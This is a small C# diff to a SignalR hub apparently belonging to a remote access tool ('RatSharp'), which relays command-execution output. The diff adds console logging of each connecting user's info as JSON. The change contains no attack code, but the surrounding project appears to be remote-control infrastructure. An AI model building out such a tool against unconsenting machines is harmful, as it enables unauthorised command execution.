@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Text.Json;
 using System.Threading.Tasks;
 using Data;
 using Microsoft.AspNetCore.SignalR;
@@ -65,7 +66,15 @@ public class RatSharpHub : Hub<IRatSharpClient>
 
   public void IdentifyAsUser(UserInfo userInfo)
   {
-    UserRepository.AddOrUpdate(Context.ConnectionId, userInfo);
+    string userId = Context.ConnectionId;
+    UserRepository.AddOrUpdate(userId, userInfo);
+    var jsonOptions = new JsonSerializerOptions
+    {
+      WriteIndented = true
+    };
+    string userJson = JsonSerializer.Serialize(userInfo, jsonOptions);
+    Console.WriteLine($"New user connected with id {userId}");
+    Console.WriteLine(userJson);
   }
 
   public async Task SendExecuteCommandResponse(string commandOutput)
